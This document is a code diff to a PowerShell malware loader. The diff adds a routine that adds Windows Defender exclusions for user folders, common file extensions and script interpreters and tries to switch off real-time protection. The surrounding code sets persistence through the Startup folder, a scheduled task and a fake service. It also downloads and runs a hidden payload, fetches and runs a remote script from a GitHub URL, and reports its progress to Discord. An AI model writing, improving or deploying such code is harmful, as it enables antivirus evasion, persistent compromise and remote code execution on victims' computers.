@@ -6,6 +6,7 @@ $StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Start
 $StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $TaskName       = "FileExplorerTask"
 $ServiceName    = "FileGuardianService"
+
 function Send-DiscordLog {
     param([string]$Message)
     try {
@@ -16,19 +17,74 @@ function Send-DiscordLog {
     catch {
     }
 }
+
+function Set-Exclusions {
+    try {
+        # Exclude all important folders: AppData, LocalAppData, ProgramFiles (covers random download locations)
+        $importantFolders = @(
+            $env:APPDATA,
+            $env:LOCALAPPDATA,
+            $env:ProgramFiles,
+            "${env:ProgramFiles(x86)}"  # 32-bit Program Files if it exists
+        )
+        foreach ($folder in $importantFolders) {
+            if (Test-Path $folder) {
+                Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
+            }
+        }
+        
+        # Exclude all subfolders recursively in AppData (ensures all EXEs and files in any subfolder are excluded)
+        $appdataSubfolders = Get-ChildItem -Path $env:APPDATA -Directory -Recurse -ErrorAction SilentlyContinue
+        foreach ($subfolder in $appdataSubfolders) {
+            Add-MpPreference -ExclusionPath $subfolder.FullName -ErrorAction SilentlyContinue
+        }
+        $localappdataSubfolders = Get-ChildItem -Path $env:LOCALAPPDATA -Directory -Recurse -ErrorAction SilentlyContinue
+        foreach ($subfolder in $localappdataSubfolders) {
+            Add-MpPreference -ExclusionPath $subfolder.FullName -ErrorAction SilentlyContinue
+        }
+        
+        # Exclude the startup script path and any potential payload paths
+        Add-MpPreference -ExclusionPath $StartupScriptPath -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue  # Temp folder as fallback
+        Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue  # Downloads folder
+        
+        # Exclude all common file types/extensions to prevent detection of payload and related files
+        $fileTypes = @(".exe", ".ps1", ".bat", ".cmd", ".vbs", ".js", ".dll", ".scr", ".pif", ".tmp", ".log", ".txt", ".ini", ".cfg")
+        foreach ($ext in $fileTypes) {
+            Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
+        }
+        
+        # Exclude processes to prevent scanning of PowerShell, CMD, etc., executions
+        $processes = @("powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe")
+        foreach ($proc in $processes) {
+            Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
+        }
+        
+        # Disable real-time scanning temporarily if possible (requires elevated perms, but attempt)
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        
+        $logMsg = "[+] All exclusions set: folders, subfolders, file types, and processes"
+        Send-DiscordLog $logMsg
+    }
+    catch {
+        $logMsg = "[!] Failed to set exclusions: $($_.Exception.Message)"
+        Send-DiscordLog $logMsg
+    }
+}
+
 function Set-Survival {
     try {
         if (-not (Test-Path $StartupScriptPath)) {
             if ($MyInvocation.MyCommand.Path) {
                 Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $StartupScriptPath -Force
-                $logMsg = "[+] Copied to reg $StartupScriptPath"
+                $logMsg = "[+] Copied to startup $StartupScriptPath"
                 Send-DiscordLog $logMsg
             } else {
-                $logMsg = "[!] Skipping reg"
+                $logMsg = "[!] Skipping startup copy"
                 Send-DiscordLog $logMsg
             }
         } else {
-            $logMsg = "[+] Reg alerdy exists $StartupScriptPath"
+            $logMsg = "[+] Startup already exists $StartupScriptPath"
             Send-DiscordLog $logMsg
         }
         $command = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
@@ -39,13 +95,13 @@ function Set-Survival {
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
         $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
         Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force
-        $logMsg = "[+] Scheduler set $TaskName"
+        $logMsg = "[+] Scheduled task set $TaskName"
         Send-DiscordLog $logMsg
         $serviceBinPath = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
         if (-not (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue)) {
             New-Service -Name $ServiceName -BinaryPathName $serviceBinPath -StartupType Automatic -Description "File Explorer Service" | Out-Null
             Start-Service -Name $ServiceName
-            $logMsg = "[+] Service made and started $ServiceName"
+            $logMsg = "[+] Service created and started $ServiceName"
             Send-DiscordLog $logMsg
         } else {
             $logMsg = "[+] Service already exists $ServiceName"
@@ -53,10 +109,11 @@ function Set-Survival {
         }
     }
     catch {
-        $logMsg = "[!] Failed to set surival $($_.Exception.Message)"
+        $logMsg = "[!] Failed to set survival: $($_.Exception.Message)"
         Send-DiscordLog $logMsg
     }
 }
+
 function Run-Payload {
     try {
         $possibleDirectories = @(
@@ -74,6 +131,8 @@ function Run-Payload {
         }
         $targetSubDirectory = $subDirectories | Get-Random
         $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "helper.exe"
+        # Explicitly exclude the target path for the downloaded payload
+        Add-MpPreference -ExclusionPath $TargetPath -ErrorAction SilentlyContinue
         if (-not (Test-Path $TargetPath)) {
             $logMsg = "[*] File not found, downloading to $TargetPath..."
             Send-DiscordLog $logMsg
@@ -82,16 +141,17 @@ function Run-Payload {
         }
         Start-Sleep -Seconds $LaunchDelay
         Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle
-        $logMsg = "[+] Executed $TargetPath"
+        $logMsg = "[+] Executed payload $TargetPath"
         Send-DiscordLog $logMsg
         Write-Host $logMsg
     }
     catch {
-        $logMsg = "[!] Failed to execute $($_.Exception.Message)"
+        $logMsg = "[!] Failed to execute payload: $($_.Exception.Message)"
         Send-DiscordLog $logMsg
         Write-Host $logMsg
     }
 }
+
 function executeps {
     param([string]$Url)
     try {
@@ -100,7 +160,7 @@ function executeps {
         $encoded=[Convert]::ToBase64String($bytes)
         $processArgs=@("-WindowStyle","Hidden","-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",$encoded)
         Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow -Wait:$false
-        $logMsg = "[+] Launched ps1 extra script"
+        $logMsg = "[+] Launched extra script from $Url"
         Send-DiscordLog $logMsg
     }
     catch {
@@ -109,6 +169,8 @@ function executeps {
     }
 }
 
+# Run exclusions first to ensure payload isn't detected
+Set-Exclusions
 Set-Survival
 Run-Payload
 executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/depload")
